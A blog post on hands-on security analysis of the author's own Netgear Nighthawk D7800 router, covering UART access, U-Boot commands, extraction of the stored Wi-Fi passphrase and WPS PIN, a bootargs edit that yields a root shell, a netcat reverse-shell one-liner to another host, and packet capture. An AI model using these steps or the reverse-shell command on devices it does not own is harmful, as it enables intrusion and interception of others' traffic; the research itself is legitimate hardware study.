---
layout: post
title: Netgear Nighthawk X4S D7800 Analysis
permalink: /netgear_1
---

In this post, I propose a report about the Analysis activities performed on the Netgear Nighthawk X4S D7800 router. This is my first project of this kind, so I started from quite an old piece of unused hardware. 

## UART Access and Bootloader Analysis

Initial hardware interaction with the Netgear Nighthawk X4S D7800 was established through the UART interface. The UART pinout was identified via continuity and voltage tests using a multimeter. An ESP32 microcontroller, configured as a UART-to-USB bridge, was used to facilitate serial communication between the target device and a host machine. This setup enabled communication between the UART and USB interfaces at a baud rate of 115200 bps, according to NETGEAR's documentation. This is the code loaded into the ESP32 to work as an adapter: 

```C
#define RXD2 16 // ESP32 UART2 RX
#define TXD2 17 // ESP32 UART2 TX

void setup() {
 Serial.begin(115200); // USB serial to PC
 Serial2.begin(115200, SERIAL_8N1, RXD2, TXD2); // UART2 to device
}

void loop() {
  // Forward data from UART2 to USB
  while (Serial2.available()) {
 Serial.write(Serial2.read());
 }

  // Forward data from USB to UART2
  while (Serial.available()) {
 Serial2.write(Serial.read());
 }
}
```

Upon powering the device, the bootloader sequence output was captured via the serial console. The boot process revealed that the router employs a customized build of U-Boot 2012.07. Notably, the loader identified the hardware model, available memory, and NAND configuration. 

First thing obtained in output:
```
U-Boot 2012.07 [local,local] (Jul 01 2015 - 13:18:15)

U-boot 2012.07 dni1 V1.1 for DNI HW ID: 29764958 NOR flash 0MB NAND flash 128MB RAM 512MB 1st Radio 4x4 2nd Radio 4x4 + xDSL
smem ram ptable found: ver: 0 len: 5
DRAM:  491 MiB
NAND:  SF: Unsupported manufacturer 00
ipq_spi: SPI Flash not found (bus/cs/speed/mode) = (0/0/48000000/0)
128 MiB
MMC:   
*** Warning - bad CRC, using default environment

PCI0 Link Initialised
PCI1 Link Initialised
In:    serial
Out:   serial
Err:   serial
 131072 bytes read: OK
cdp: get part failed for 0:HLOS
Net:   MAC1 addr:b0:7f:b9:45:36:a5
athrs17_reg_init: complete
athrs17_vlan_config ...done
S17c init  done
MAC2 addr:b0:7f:b9:45:36:a4
eth0, eth1
Hit any key to stop autoboot:  2 ... 1 ... 0 

```
During this phase, a timeout window for interrupting the boot sequence was present, enabling entry into an interactive U-Boot shell. By typing `help`, it was possible to get a list of available commands: 

```
(IPQ) # help

?       - alias for 'help'
base    - print or set address offset
board_hw_id_set- Set board_hw_id
board_hw_id_show- Show board_hw_id
board_model_id_set- Set board_model_id
board_model_id_show- Show board_model_id
board_parameters_set- Set WPS PIN code, Serial number, SSID, Passphrase, MAC address
board_parameters_show- Show WPS PIN code, Serial number, SSID, Passphrase, MAC address.
board_passphrase_set- Set passphrase on board
board_passphrase_show- Show board_passphrase
board_ssid_set- Set ssid on board
board_ssid_show- Show board_ssid
bootipq - bootipq from flash device
bootipq2- bootipq2 from flash device
bootm   - boot application image from memory
bootmbn - bootmbn from flash device
bootp   - boot image via network using BOOTP/TFTP protocol
bootz   - boot Linux zImage image from memory
button_test- Test buttons
chk_dniimg- check integrity of DNI firmware image.
chpart  - change active partition
cmp     - memory compare
cp      - memory copy
crc32   - checksum calculation
dhcp    - boot image via network using DHCP/TFTP protocol
echo    - echo args to console
env     - environment handling commands
exit    - exit script
false   - do nothing, unsuccessfully
fdt     - flattened device tree utility commands
fw_recovery- start tftp server to recover the DNI firmware image.
go      - start application at address 'addr'
help    - print command description/usage
i2c     - I2C sub-system
iminfo  - print header information for application image
imxtract- extract a part of a multi-image
ipq_nand- Switch between SBL and Linux kernel page layout.
ledctl  - Test LEDs
loadn_dniimg- load DNI firmware image from NAND.
loop    - infinite loop on address range
macset  - Set ethernet MAC address
macshow - Show Ethernet MAC addresses
md      - memory display
mii     - MII utility commands
mm      - memory modify (auto-incrementing address)
mmc     - MMC subsystem
mmcinfo - display MMC info
mphyrd  - qca8511 packet processor PHY register display
mphyrw  - qca8511 packet processor PHY register write (fill)
mprd    - qca8511 packet processor register display
mprw    - qca8511 packet processor register write (fill)
mtdparts- define flash/nand partitions
mtest   - simple RAM read/write test
mw      - memory write (fill)
nand    - NAND sub-system
nboot   - boot from NAND device
nm      - memory modify (constant address)
nmrp    - start nmrp mechanism to upgrade firmware-image or string-table.
pci     - list and access PCI Configuration Space
ping    - send ICMP ECHO_REQUEST to network host
printenv- print environment variables
reset   - Perform RESET of the CPU
rnset   - set region number
rnshow  - Show Region Number on Board
run     - run commands in an environment variable
saveenv - save environment variables to persistent storage
setenv  - set environment variables
sf      - SPI flash sub-system
showvar - print local hushshell variables
sleep   - delay execution for some time
smeminfo- print SMEM FLASH information
snset   - Set serial number
source  - run script from memory
test    - minimal test like /bin/sh
tftpboot- boot image via network using TFTP protocol
true    - do nothing, successfully
ubi     - ubi commands
usb     - USB sub-system
usbboot - boot from USB device
version - print monitor, compiler and linker version
wpspinset- Set wpspin number
(IPQ) # 
```

The U-Boot prompt exposes a wide set of commands, including vendor-specific extensions. Noteworthy among them are utilities for direct interaction with hardware identifiers (`board_hw_id_show`), SSID and passphrase retrieval (`board_parameters_show`), and firmware image validation (`chk_dniimg`). These extensions provide insight into the embedded firmware's metadata, including factory-provisioned credentials and network interface configurations.

```
(IPQ) # board_parameters_show

 131072 bytes read: OK
WPSPIN code: 20193386
Serial Number: 4G64635P005E9
SSID: NETGEAR26
PASSPHRASE: fancyink349
lan mac: b0:7f:b9:45:36:a4
wan mac: b0:7f:b9:45:36:a5
wlan5g mac: b0:7f:b9:45:36:a6
(IPQ) #
```

`fancyink349` was the current AP password. By sending the `version` command we get: 

```
(IPQ) # version


U-Boot 2012.07 [local,local] (Jul 01 2015 - 13:18:15)
arm-openwrt-linux-uclibcgnueabi-gcc (Linaro GCC 4.6-2012.02) 4.6.3 20120201 (prerelease)
GNU ld (GNU Binutils) 2.22
(IPQ) # 
```

So the firmware the router is using is an OpenWRT release. 


The `mtdparts` command is available. By making some searches on the Internet, i found that NAND memory devices are abstracted by the MTD mechanism, that defines partitions. To better handle partitions, optimizing storage and read/write operations, the UBI abstraction is adopted on top of MTD devices. UBI volumes are defined, together with the UBI file system, to be used in UBI volumes and mountable by the system. 


By now, the command returns these partitions. 
```
(IPQ) # mtdparts

mtdparts variable not set, see 'help mtdparts'
no partitions defined

defaults:
mtdids  : nand0=msm_nand
mtdparts: mtdparts=msm_nand:3584K@0x7980000(language),3M@0x7d00000(dnidata)
(IPQ) # 
```

Further inspection of the environment variables (`printenv`) revealed an insecure configuration: critical parameters, such as bootargs and bootcmd, are writable at runtime. This facilitates alteration of the boot process.

```
(IPQ) # printenv

baudrate=115200
bootargs=console=ttyHSL1,115200n8
bootcmd=sleep 2;   nmrp;  if loadn_dniimg 0 0x1480000 0x44000000 && chk_dniimg 0x44000000; then bootipq2; else fw_recovery; fi
bootdelay=2
config_ubi_prepare=mtdparts default; ubi part dnidata
ethact=eth0
ipaddr=192.168.1.1
language_ubi_prepare=mtdparts default; ubi part language
loadaddr=0x42000000
machid=1260
modelid=D7800
mtdids=nand0=msm_nand
serverip=192.168.1.10
stderr=serial
stdin=serial
stdout=serial
updateloader=ipq_nand sbl && nand erase 0x00c80000 0x00580000 && imgaddr=0x42000000 && source $imgaddr:script

Environment size: 607/262140 bytes
```

I tried to modify the `bootargs` env to alter the bootup process: 

```
(IPQ) # setenv bootargs console=ttyHSL1,115200n8 init=/bin/sh
```

The boot command is shown in `bootcmd`. The command used to proceed with booting is `bootipq2`. By entering this command, the boot process resumes. Given the update of `bootargs`, a shell is spawned: 

```
BusyBox v1ï¿½nter 'help' for a list of built-in commands.

/bin/sh: can't access tty; job control turned off
/ $ 
```

A BusyBox shell gets spawned.

```
/ $ id
uid=0 gid=0
/ $ ls -la
drwxr-xr-x   16 0        0             466 May 25  2018 .
drwxr-xr-x   16 0        0             466 May 25  2018 ..
drwxr-xr-x    2 0        0             927 May 25  2018 bin
-rw-r--r--    1 0        0               9 May 25  2018 cloud_version
-rw-r--r--    1 0        0              11 May 25  2018 default_language_version
drwxr-xr-x    2 0        0               3 May 24  2018 dev
-rw-r--r--    1 0        0             765 May 25  2018 dni-gconfig
drwxr-xr-x   32 0        0            1636 May 25  2018 etc
-rw-r--r--    1 0        0               1 May 25  2018 firmware_region
-rw-r--r--    1 0        0              29 May 25  2018 firmware_time
-rw-r--r--    1 0        0              10 May 25  2018 firmware_version
-rw-r--r--    1 0        0               6 May 25  2018 hardware_version
lrwxrwxrwx    1 0        0               4 May 25  2018 home -> /tmp
-rw-r--r--    1 0        0              27 May 25  2018 hw_id
drwxr-xr-x   16 0        0             783 May 25  2018 lib
lrwxrwxrwx    1 0        0               8 May 25  2018 mnt -> /tmp/mnt
-rw-r--r--    1 0        0               6 May 25  2018 module_name
drwxr-xr-x    3 0        0              29 May 25  2018 opt
drwxr-xr-x    2 0        0               3 May 24  2018 overlay
drwxr-xr-x    2 0        0               3 May 24  2018 proc
drwxr-xr-x    2 0        0              27 May 25  2018 rom
drwxr-xr-x    2 0        0               3 May 24  2018 root
drwxr-xr-x    3 0        0            2150 May 25  2018 sbin
drwxr-xr-x    2 0        0               3 May 24  2018 sys
drwxrwxrwt    3 0        0              28 May 25  2018 tmp
drwxr-xr-x   11 0        0             175 May 24  2018 usr
lrwxrwxrwx    1 0        0               4 May 25  2018 var -> /tmp
drwxr-xr-x   13 0        0           16632 May 24  2018 www
/ $ touch /root/test
touch: /root/test: Read-only file system
/ $ 
```

Upon resuming the boot sequence with the modified bootargs, the system launched into a minimal shell provided by BusyBox. This early boot environment granted root privileges, albeit within a constrained context where the root filesystem was mounted as read-only. Attempts to modify files in persistent directories such as /root failed due to the read-only fs. 

A subsequent reboot using the default bootcmd surprisingly led to a full boot of the embedded Linux system, culminating in a persistent root shell being exposed on the UART interface:

```
BusyBox v1.4.2 (2018-05-24 17:32:12 EDT) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

 MM           NM                    MMMMMMM          M       M
 $MMMMM        MMMMM                MMMMMMMMMMM      MMM     MMM
 MMMMMMMM     MM MMMMM.              MMMMM:MMMMMM:   MMMM   MMMMM
MMMM= MMMMMM  MMM   MMMM       MMMMM   MMMM  MMMMMM   MMMM  MMMMM'
MMMM=  MMMMM MMMM    MM       MMMMM    MMMM    MMMM   MMMMNMMMMM
MMMM=   MMMM  MMMMM          MMMMM     MMMM    MMMM   MMMMMMMM
MMMM=   MMMM   MMMMMM       MMMMM      MMMM    MMMM   MMMMMMMMM
MMMM=   MMMM     MMMMM,    NMMMMMMMM   MMMM    MMMM   MMMMMMMMMMM
MMMM=   MMMM      MMMMMM   MMMMMMMM    MMMM    MMMM   MMMM  MMMMMM
MMMM=   MMMM   MM    MMMM    MMMM      MMMM    MMMM   MMMM    MMMM
MMMM$ ,MMMMM  MMMMM  MMMM    MMM       MMMM   MMMMM   MMMM    MMMM
 MMMMMMM:      MMMMMMM     M         MMMMMMMMMMMM  MMMMMMM MMMMMMM
 MMMMMM       MMMMN     M           MMMMMMMMM      MMMM    MMMM
 MMMM          M                    MMMMMMM        M       M
 M
 ---------------------------------------------------------------
 For those about to rock... (%C, %R)
 ---------------------------------------------------------------
root@D7800:/# 
```

```
root@D7800:/# mount
rootfs on / type rootfs (rw)
/dev/root on /rom type squashfs (ro,relatime)
proc on /proc type proc (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime,size=0k)
tmpfs on /dev type tmpfs (rw,relatime,size=512k,mode=755)
devpts on /dev/pts type devpts (rw,relatime,mode=600)
none on /proc/bus/usb type usbfs (rw,relatime)
ubi0:overlay_volume on /overlay type ubifs (rw,relatime)
overlayfs:/overlay on / type overlayfs (rw,relatime,lowerdir=/,upperdir=/overlay)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
```

```
root@D7800:/# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
 inet 127.0.0.1/8 scope host lo
2: sit0: <NOARP> mtu 1480 qdisc noop state DOWN 
 link/sit 0.0.0.0 brd 0.0.0.0
3: ethwan: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc pfifo_fast state DOWN qlen 1000
 link/ether b0:7f:b9:45:36:a5 brd ff:ff:ff:ff:ff:ff
4: ethlan: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast master br0 state UP qlen 1000
 link/ether b0:7f:b9:45:36:a4 brd ff:ff:ff:ff:ff:ff
5: pas0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast master br0 state UNKNOWN qlen 1000
 link/ether b0:7f:b9:45:36:a5 brd ff:ff:ff:ff:ff:ff
6: qca-nss-dev0: <> mtu 0 qdisc noop state DOWN 
 link/generic 
7: qca-nss-dev1: <> mtu 0 qdisc noop state DOWN 
 link/generic 
8: qca-nss-dev2: <> mtu 0 qdisc noop state DOWN 
 link/generic 
9: qca-nss-dev3: <> mtu 0 qdisc noop state DOWN 
 link/generic 
10: ifb0: <BROADCAST,NOARP> mtu 1500 qdisc noop state DOWN qlen 32
 link/ether 3a:b3:a8:12:93:ef brd ff:ff:ff:ff:ff:ff
11: ifb1: <BROADCAST,NOARP> mtu 1500 qdisc noop state DOWN qlen 32
 link/ether ca:87:fa:c9:d0:ba brd ff:ff:ff:ff:ff:ff
12: bond0: <BROADCAST,MULTICAST,MASTER> mtu 1500 qdisc noop state DOWN 
 link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
13: br0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
 link/ether b0:7f:b9:45:36:a4 brd ff:ff:ff:ff:ff:ff
 inet 10.3.14.50/24 brd 10.3.14.255 scope global br0
14: brwan: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN 
 link/ether b0:7f:b9:45:36:a5 brd ff:ff:ff:ff:ff:ff
15: wifi0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 539
 link/ieee802.11 b0:7f:b9:45:36:a6 brd ff:ff:ff:ff:ff:ff
16: wifi1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 539
 link/ieee802.11 b0:7f:b9:45:36:a4 brd ff:ff:ff:ff:ff:ff
17: ath1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br0 state UNKNOWN 
 link/ether b0:7f:b9:45:36:a4 brd ff:ff:ff:ff:ff:ff
18: ath0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br0 state UNKNOWN 
 link/ether b0:7f:b9:45:36:a6 brd ff:ff:ff:ff:ff:ff
```

We can directly have access to the entire system via this root shell. Hoewever, the exploitability is limited, since it requires an obvious invasive physical access. 

```
netstat -tuln | grep LISTEN
tcp        0      0 10.3.14.50:49152        0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:33344           0.0.0.0:*               LISTEN      
tcp        0      0 10.3.14.50:49153        0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9100            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9101            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9102            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9103            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9104            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9105            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9106            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9107            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9108            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9109            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:631             0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      
tcp        0      0 :::548                  :::*                    LISTEN      
tcp        0      0 :::80                   :::*                    LISTEN      
tcp        0      0 :::53                   :::*                    LISTEN      
tcp        0      0 :::443                  :::*                    LISTEN   
```

These are the running processes: 
```
ps w
 PID  Uid     VmSize Stat Command
 1 root        400 S   init       
 2 root            SW  [kthreadd]
 3 root            SW  [ksoftirqd/0]
 4 root            DW  [kworker/0:0]
 5 root            SW  [kworker/u:0]
 6 root            SW  [migration/0]
 7 root            SW  [migration/1]
 8 root            SW  [kworker/1:0]
 9 root            SW  [ksoftirqd/1]
 10 root            SW< [khelper]
 11 root            SW  [kworker/u:1]
 30 root            SW  [kworker/0:1]
 109 root            SW  [irq/202-msmdata]
 272 root            SW  [sync_supers]
 274 root            SW  [bdi-default]
 275 root            SW< [crypto]
 276 root            SW< [kblockd]
 281 root            SW< [ata_sff]
 285 root            SW< [spi_qsd.5]
 288 root            SW  [msm-spi-thread]
 299 root            SW  [khubd]
 392 root            SW< [modem_notifier]
 394 root            SW< [smd_channel_clo]
 395 root            SW< [smsm_cb_wq]
 420 root            SW< [qmi]
 449 root            SW< [nmea]
 451 root            SW< [rpcrouter]
 467 root            SW  [kswapd0]
 512 root            SW  [fsnotify_mark]
 538 root            SW< [smux_notify_wq]
 539 root            SW< [smux_tx_wq]
 540 root            SW< [smux_rx_wq]
 541 root            SW< [smux_loopback_w]
 547 root            SW< [k_hsuart]
 559 root            SW  [scsi_eh_0]
 562 root            SW  [kworker/u:2]
 574 root            SW  [mtdblock0]
 579 root            SW  [mtdblock1]
 584 root            SW  [mtdblock2]
 589 root            SW  [mtdblock3]
 594 root            SW  [mtdblock4]
 597 root            SW  [kworker/1:1]
 600 root            SW  [mtdblock5]
 605 root            SW  [mtdblock6]
 610 root            SW  [mtdblock7]
 615 root            SW  [mtdblock8]
 620 root            SW  [mtdblock9]
 625 root            SW  [mtdblock10]
 630 root            SW  [mtdblock11]
 643 root            SW  [ubi_bgt0d]
 646 root            SW  [ubi_bgt1d]
 650 root            SW  [ubi_bgt2d]
 657 root            SW  [mtdblock12]
 666 root            SW  [mtdblock13]
 675 root            SW  [mtdblock14]
 684 root            SW  [mtdblock15]
 693 root            SW  [mtdblock16]
 702 root            SW  [mtdblock17]
 711 root            SW  [mtdblock18]
 720 root            SW  [mtdblock19]
 729 root            SW  [mtdblock20]
 796 root            SW< [iewq]
 797 root            DW  [kinteractiveup]
 806 root            SW< [msm-cpufreq]
 810 root            SW< [rq_stats]
 817 root            SW< [deferwq]
 1312 root            SW  [ubifs_bgt0_5]
 1353 root        380 S   /bin/sh /etc/init.d/rcS S boot 
 1355 root        372 S   logger -s -p 6 -t sysinit 
 1360 root        480 S   /bin/ash --login 
 1378 root        300 S   klogd 
 1391 root        280 S   /bin/datalib -f /tmp/etc//datalib.conf -p /dev/mtd19 -m 538120740 
 1423 root            SW< [xfsalloc]
 1424 root            SW< [xfs_mru_cache]
 1425 root            SW< [xfslogd]
 1430 root            SW< [gmac_workqueue]
 1435 root            SW< [nss_freq_queue]
 1463 root            SW< [bond0]
 1576 root        560 S   hotplug2 --override --persistent --set-rules-file /etc/hotplug2.rules --set-coldplug-cmd /sbin/udevtrigger
 1588 root        468 S   hotplug2 --override --persistent --set-rules-file /etc/hotplug2.rules --set-coldplug-cmd /sbin/udevtrigger
 1589 root        468 S   hotplug2 --override --persistent --set-rules-file /etc/hotplug2.rules --set-coldplug-cmd /sbin/udevtrigger
 1591 root        472 S   hotplug2 --override --persistent --set-rules-file /etc/hotplug2.rules --set-coldplug-cmd /sbin/udevtrigger
 1592 root        468 S   hotplug2 --override --persistent --set-rules-file /etc/hotplug2.rules --set-coldplug-cmd /sbin/udevtrigger
 1682 root        244 S   /sbin/ubusd 
 1856 root        272 S   /usr/bin/detcable 2 dsl 
 2063 root            SW  [kworker/0:2]
 2080 root            SW  [flush-ubifs_0_5]
 2214 root        332 S   udhcpd /tmp/udhcpd.conf 
 2541 root        220 S   net-scan -f /tmp/etc//netscan.conf 
 2546 root        268 S   lld2d br0 
 2559 root        172 S   /usr/sbin/telnetenable -r English -p password -i br0 
 2562 root        284 S   /bin/sh /etc/rc.common /etc/init.d/samba boot 
 2598 root            SW  [ telnetDBGD ]
 2599 root            SW  [ acktelnetDBGD ]
 2600 root            SW  [checkSBusTimeou]
 2602 root            SW  [NU TCP]
 2603 root            SW  [NU UDP]
 2604 root        380 S   /sbin/KC_BONJOUR 
 2605 root        424 S   /sbin/KC_PRINT 
 2886 root        312 S   /usr/sbin/miniupnpd 
 3059 root        268 S   /usr/sbin/ntgrddns -c /tmp/ntgrdns.conf 
 3094 root        300 S   traffic_meter -w brwan -p ppp0 -m /dev/mtd14 
 3170 root        240 S   /usr/sbin/uhttpd -h /www -r D7800 -x /cgi-bin -t 30 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s
 3177 root        268 S   /usr/sbin/fw-checking -c net-cgi -c -g net-cgi -s -s /tmp/Seria_Number -t time_zone 
 3185 root        116 S   inetd 
 3202 root        128 S   acld 
 3203 root        212 S   aclhijackdns 
 3227 root        324 S   /usr/sbin/ntpclient -w dhcp -n brwan -z GMT-0 -e 1 
 3268 root        236 S   /usr/bin/hd-idle -i 1800 
 3276 root        184 S   /usr/sbin/tftpd-hpa -l -s /var/tftpd-hpa 
 3296 guest       344 S   /usr/sbin/dnsmasq --except-interface=lo -r /tmp/resolv.conf 
 3344 root        364 S   syslogd -m 0 -T GMT-0 -c 1407 
 3379 root        384 S   crond -c /tmp/etc/crontabs -T GMT-0 
 3391 root        196 S   i_potval -T GMT-0 -d /dev/mtd20 -d /dev/mtd20 
 3392 root        444 S   /bin/sh /usr/sbin/netconn.sh 
 3416 root        480 S   /bin/sh /etc/rc.common /etc/rc.d/S80wlan-common boot 
 3632 root        604 S   /usr/sbin/dbus-daemon --system 
 3770 root        992 S   avahi-daemon: running [D7800.local]             
 3799 root        480 S   /bin/sh /etc/rc.common /etc/init.d/run_afpd start 
 4212 root        892 S   /bin/sh /sbin/wlan up 
 4369 root        848 S   /bin/sh /sbin/wlan up 
 4376 root             /bin/sh /sbin/wlan up 
 4381 root        296 S   sleep 3 
 4429 root        308 S   update_afp 
 4434 root        404 R   ps w
```

## Spawning a reverse shell
Since we have access to a root shell, it will be possible to simply spawn a reverse shell via the command: 

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.3.14.14 6969 >/tmp/f
```
Netcat is not used in the "classic" way, since the installed version is older. 

## Network traffic interception

To capture the network traffic, an interesting interface from the `ip a` command is `br0`. By launching `tcpdump` on that: 
```
tcpdump -c 10 -i br0 -o dump.pcap
```

It is possible to capture any packet transmitted among the physical ports. 

## Conclusions
The presence of an unprotected root shell enables performing various actions and further analysis. For instance, a firmware dump can be performed to analyze the content on a separate device. Future work could also include reversing the custom binary in execution in the router. 

